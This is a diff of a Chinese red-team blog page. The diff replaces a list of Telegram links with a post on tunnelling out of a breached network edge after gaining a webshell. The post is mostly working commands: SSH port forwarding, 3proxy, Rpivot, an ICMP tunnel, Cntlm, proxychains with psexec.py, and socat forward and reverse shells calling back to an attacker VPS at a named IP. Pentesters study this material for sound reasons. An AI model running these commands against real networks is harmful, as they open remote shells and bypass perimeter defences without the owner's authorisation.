@@ -26,7 +26,7 @@
 
   
 
-  <title>友链 | ꧁༺黑色༒星辰༻꧂</title>
+  <title>穿越边界的姿势 | ꧁༺黑色༒星辰༻꧂</title>
 
   
 
@@ -47,7 +47,7 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
     <div class="post-image" style="background-image: url(https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fphoto.669pic.com%2Fshow_photos2%2F8e1665bc10ca363a1da851cef8a72ee5.jpg&amp;refer=http%3A%2F%2Fphoto.669pic.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1636710563&amp;t=16a039c010bd876cc3e23b88f5fd52a4)"></div>
   
@@ -97,40 +97,182 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">友链</h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">穿越边界的姿势</h1>
+          <h2 class="title-sub-wrap">
+            <strong>ANQUSEC</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-10-30T12:54:53.000Z" itemprop="datePublished">2021-10-30</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%B8%97%E9%80%8F/">📒 渗透</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/">🏷️ 代理转发</a></li>
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>技术交流群：<a target="_blank" rel="noopener" href="https://t.me/APT360">https://t.me/APT360</a></p>
-<p><img src="/links/image-20211013170606858.png" alt="image-20211013170606858"></p>
-<p>工具分享：<a target="_blank" rel="noopener" href="https://t.me/APT002">https://t.me/APT002</a></p>
-<p><img src="/links/image-20211013170631600.png" alt="image-20211013170631600"></p>
+        <p>在企业安全对抗中，红方攻击团队经常会遇到这种情况，在企业的网络边界上获取到部分权限，比如一个web服务器的webshell，然而如何更方便的进行下一步的渗透呢？如何对内网进行渗透测试，这时就需要隧道转发技术，穿透边界防火墙、安全代理等安全设备，进行深层次的安全测试。本文的主要内容是穿透内网的各种姿势。</p>
+<h2 id="典型的边界网络架构图"><a href="#典型的边界网络架构图" class="headerlink" title="典型的边界网络架构图"></a>典型的边界网络架构图</h2><p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="img"></p>
+<h2 id="利用ssh建立隧道"><a href="#利用ssh建立隧道" class="headerlink" title="利用ssh建立隧道"></a>利用ssh建立隧道</h2><h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><p>原理：建立一个动态的SOCKS4/5的代理通道，紧接着的是本地监听的端口号；动态端口转发是建立一个ssh加密的SOCKS4/5代理通道，任何支持SOCKS4/5协议的程序都可以使用这个加密的通道来进行代理访问。</p>
+<p>本地执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@106.22.50.48</span><br></pre></td></tr></table></figure>
+
+<p>效果：本地监听1080端口，我们可以使用具有socks端口功能的应用，可以通过代理：127.0.0.1:1080上网，如果非要在目标内网使用，</p>
+<p>可以在server B上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@10.3.1.6</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以通过server B的1080端口访问办公网的资源。如果serverB的ssh可以访问，</p>
+<p>可以在本地执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@222.222.222.223</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以通过本地127.0.0.1:1080访问目标内网资源。</p>
+<h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>原理：将本地机(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发是在localhost上监听一个端口，所有访问这个端口的数据都会通过ssh 隧道传输到远端的对应端口。</p>
+<p>在serverB上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 7001:localhost:7070 root@106.22.50.48</span><br></pre></td></tr></table></figure>
+
+<p>作用：serverB监听7001端口，并将7001端口的数据转发到vps的7070端口</p>
+<p>利用：在serverB上运行一个socks代理，代理端口设置为7001，这样再执行上面的命令，这样我们就相当于建立了一个socks5隧道。</p>
+<h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>原理：将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口；远程端口转发是在远程主机上监听一个端口，所有访问远程服务器的指定端口的数据都会通过ssh 隧道传输到本地的对应端口。</p>
+<p>在serverB上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost: ssh -R 1433:localhost:7070  root@10.3.1.6</span><br></pre></td></tr></table></figure>
+
+<p>作用：将10.3.1.6的3306端口转发到serverB的7070端口，这样我们在访问serverB的7070端口时，其实访问到的是10.3.1.6的3306端口。</p>
+<h2 id="使用3proxy建立隧道"><a href="#使用3proxy建立隧道" class="headerlink" title="使用3proxy建立隧道"></a>使用3proxy建立隧道</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>工具地址： <a target="_blank" rel="noopener" href="https://github.com/z3APA3A/3proxy/releases">https://github.com/z3APA3A/3proxy/releases</a></p>
+<p>3proxy是一个由俄罗斯人开发的多平台代理软件，支持http/https/ftp/socks4/socks5/socks4a/socks5a等多种代理方式。</p>
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows：3proxy.exe config_file</span><br><span class="line"></span><br><span class="line">linux：./3proxy config_file</span><br></pre></td></tr></table></figure>
+
+<p>这个工具的使用主要是修改配置文件。</p>
+<h3 id="建立socks代理"><a href="#建立socks代理" class="headerlink" title="建立socks代理"></a>建立socks代理</h3><p>配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/local/bin/3proxy</span><br><span class="line"></span><br><span class="line">socks -p1080</span><br></pre></td></tr></table></figure>
+
+<p>作用：新建一个socks代理，监听1080端口</p>
+<h3 id="实现端口转发"><a href="#实现端口转发" class="headerlink" title="实现端口转发"></a>实现端口转发</h3><p>配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/local/bin/3proxy</span><br><span class="line"></span><br><span class="line">tcppm 1080 106.22.50.48 7070</span><br></pre></td></tr></table></figure>
+
+<p>作用：将本地的1080端口转发到vps的7070端口</p>
+<p>其他功能大家可以自行学习。</p>
+<h2 id="使用plink实现端口转发"><a href="#使用plink实现端口转发" class="headerlink" title="使用plink实现端口转发"></a>使用plink实现端口转发</h2><p>plink的使用跟ssh类似，只是plink是在windows下运行的。</p>
+<h2 id="使用Rpivot做反向代理"><a href="#使用Rpivot做反向代理" class="headerlink" title="使用Rpivot做反向代理"></a>使用Rpivot做反向代理</h2><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/artkond/rpivot">https://github.com/artkond/rpivot</a></p>
+<p>利用方式：</p>
+<p>vps：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p>作用：在vps上新建一个socks4代理在1080端口，监听9999端口</p>
+<p>serverB：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python client.py --server-ip 106.22.50.48 --server-port 9999</span><br></pre></td></tr></table></figure>
+
+<p>作用：连接vps的9999端口，我们可以通过vps的1080端口访问目标内网。</p>
+<h2 id="建立ICMP隧道"><a href="#建立ICMP隧道" class="headerlink" title="建立ICMP隧道"></a>建立ICMP隧道</h2><p>工具地址：<a target="_blank" rel="noopener" href="http://code.gerade.org/hans/">http://code.gerade.org/hans/</a></p>
+<p>在serverB上下载编译</p>
+<p>用root执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"></span><br><span class="line">2 ./hans -s 222.222.222.223 -p password</span><br></pre></td></tr></table></figure>
+
+<p>在本地执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hans -f -c 222.222.222.223  -p password -v</span><br></pre></td></tr></table></figure>
+
+<p>会返回一个shell</p>
+<h2 id="穿透代理服务器"><a href="#穿透代理服务器" class="headerlink" title="穿透代理服务器"></a>穿透代理服务器</h2><p>条件：serverB需要通过serverA这个代理服务器上外网，且代理服务器的认证是需要域认证</p>
+<h3 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h3><p>可以使用下面的命令实现穿透：</p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="图片"></p>
+<p>如果获取到的用户密码是个Hash，解不出来的情况下：</p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="图片"></p>
+<h3 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h3><p>工具地址：<a target="_blank" rel="noopener" href="http://cntlm.sourceforge.net/">http://cntlm.sourceforge.net/</a></p>
+<p>原理：通过内网ntlm认证代理将远程务器的端口转发到本地。</p>
+<p>使用方式，在serverB上执行：</p>
+<p>windows： cntlm.exe -c config.conf</p>
+<p>linux：./cntlm -c config.conf</p>
+<p>配置文件样例：</p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/640.webp" alt="图片"></p>
+<p>作用：内网服务器访问serverB的2222端口，也就是访问到vps的443端口。</p>
+<h2 id="通过socks代理访问内网"><a href="#通过socks代理访问内网" class="headerlink" title="通过socks代理访问内网"></a>通过socks代理访问内网</h2><h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>假设代理服务器地址是：222.222.222.223:1080</p>
+<p>修改配置文件，将代理地址设置为代理服务器的地址如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">socks5  222.222.222.223 1080</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains psexec.py administrator@10.2.2.2 ipconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="proxifier"><a href="#proxifier" class="headerlink" title="proxifier"></a>proxifier</h3><p>图形化工具，大家自行测试</p>
+<h2 id="获取一个shell窗口"><a href="#获取一个shell窗口" class="headerlink" title="获取一个shell窗口"></a>获取一个shell窗口</h2><h3 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h3><p>使用nc在vps上用监听4444端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 4444</span><br></pre></td></tr></table></figure>
+
+<p>在serverB上执行：</p>
+<p><img src="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>socat</p>
+<h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><p>vps上执行监听1337端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
+
+<p>在serverB上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat FILE:`tty`,raw,echo=0 TCP:106.22.50.48:1337</span><br></pre></td></tr></table></figure>
+
+<h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><p>vps上执行监听1337：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>
+
+<p>在serverB上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4:106.22.50.48:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
 
       </section>
 
       
       
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2021/10/30/BypassUAC%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E6%80%9D%E8%B7%AF/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">BypassUAC的研究和思路</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-      
-      
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -167,6 +309,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -302,7 +446,6 @@
     </div>
   </article>
 </div>
-
 
     <!-- footer container -->
 <footer id="footer" class="footer">
